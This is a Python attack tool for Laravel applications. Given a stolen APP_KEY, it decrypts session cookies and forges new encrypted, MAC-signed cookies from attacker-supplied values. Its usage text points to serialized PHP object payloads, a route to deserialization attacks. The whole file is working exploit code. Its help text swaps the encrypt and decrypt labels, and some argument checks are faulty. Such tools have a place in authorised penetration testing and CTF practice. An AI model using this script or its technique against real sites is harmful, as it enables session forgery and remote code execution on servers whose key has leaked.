import base64
import json
import hmac
import hashlib
from Crypto import Random
from Crypto.Cipher import AES
from phpserialize import loads
import argparse
from datetime import datetime
import re
import binascii

# adaptation of the script https://gist.github.com/bluetechy/5580fab27510906711a2775f3c4f5ce3

class LaravelEncrypter:

    def __init__(self, key):
        self.key = key

    def decrypt(self, payload):
        data = json.loads(base64.b64decode(payload))

        value =  base64.b64decode(data['value'])
        iv = base64.b64decode(data['iv'])
        key=base64.b64decode(self.key)
        crypt_object=AES.new(key=key,mode=AES.MODE_CBC,IV=iv)
        return crypt_object.decrypt(value)

    def encrypt(self, value, hash):
        iv = Random.get_random_bytes(16)
        tmp_bytes = base64.b64encode(self.mcrypt_encrypt(base64.b64decode(value), iv, hash))
        b64_iv=base64.b64encode(iv).decode("ascii")
        data = {}
        data['iv'] = b64_iv
        data['value'] = tmp_bytes.decode("ascii")
        data['mac'] = hmac.new(base64.b64decode(self.key),(b64_iv+data['value']).encode("ascii"), hashlib.sha256).hexdigest()
        data['tag'] = ''
        return base64.b64encode(json.dumps(data).encode("ascii"))

    def mcrypt_encrypt(self, value, iv, hash):
        key=base64.b64decode(self.key)
        expires = int(datetime.timestamp(datetime.now())) + 86000
        value = str(value).replace("'","").replace('"','\\"').replace('\\x00','\\u0000').replace('/','\\/')[1:]
        print(value)
        returned_value = hash + '|{"data":"'+value+'","expires":'+str(expires)+'}'
        crypt_object=AES.new(key=key,mode=AES.MODE_CBC,IV=iv)
        #Padding
        pad = lambda s : s+chr(16-len(s)%16)*(16-len(s)%16)
        returned_value = pad(returned_value).encode("utf8")
        encrypted_value = crypt_object.encrypt(returned_value)
        return encrypted_value

    def unserialize(self, serialized):
        return loads(serialized)

def main():
    usage = """
    Laravel cookie decrypter/encrypter
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    <[Examples]>
    [ENCRYPT]
    python3 laravel_cookie_killer.py -d -k S3brjpadwscgUo3t0Tu/yiAAzNJql0IJs0Gado79qt4= -c <cookie>
    [*] uncyphered string
    0d30b704b5009916cebe2373c85ce35303222d81|<value>
    [DECRYPT]
    python3 laravel_cookie_killer.py -e --hash 0d30b704b5009916cebe2373c85ce35303222d81 -k S3brjpadwscgUo3t0Tu/yiAAzNJql0IJs0Gado79qt4= -v <payload>
    O:46:\"Illuminate\\<raw_value...>
    <base64_value...>
    """
    parser = argparse.ArgumentParser(description=usage, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("--decrypt", "-d", default=False, help="Decrypt mode", nargs='?', const=True)
    parser.add_argument("--encrypt", "-e", default=False, help="Encrypt mode", nargs='?', const=True)
    parser.add_argument("--cookie", "-c", default="", help="Cookie you want to decrypt")
    parser.add_argument("--key", "-k", default="", help="Key used by Laravel (stored in APP_KEY in .env)")
    parser.add_argument("--hash", default="", help="The value of the hash you had from cookie decryption")
    parser.add_argument("--value", "-v", default="", help="Value of the laravel data value you want (send it as base64)")
    
    args = parser.parse_args()

    if args.decrypt and args.encrypt:
        print("You need to chose between decrypt or encrypt.")
        exit(1)
    if args.key is not None:
        encrypter = LaravelEncrypter(args.key)
    else:
        print("[-] The argument --key is required : a base64 encoded key used by Laravel (stored in APP_KEY in .env)")
        exit(1)
    if args.decrypt:
        if args.cookie is not None :
            try:
                print("[*] uncyphered string")
                print(encrypter.decrypt(args.cookie).decode("utf-8"))
                print("[*] Base64 encoded uncyphered version")
                print(base64.b64encode(encrypter.decrypt(args.cookie)))
            except binascii.Error:
                print("[-] Invalid base64-encoded string used on arguments --cookie or --key")
                exit(1)
            except:
                print("[-] An error occured, please refer to the example to the documentation.")
                exit(1)
        else:
            print("[-] A base64 encoded key is required to use this tool (stored in APP_KEY in .env)")
            exit(1)
    if args.encrypt:
        try:
            print(encrypter.encrypt(args.value, args.hash))
        except binascii.Error:
            print("[-] Invalid base64-encoded string used on arguments --value or --key")
            exit(1)
        except:
            print("[-] An error occured, please refer to the example to the documentation.")
            exit(1)



if __name__ == "__main__":
    main()
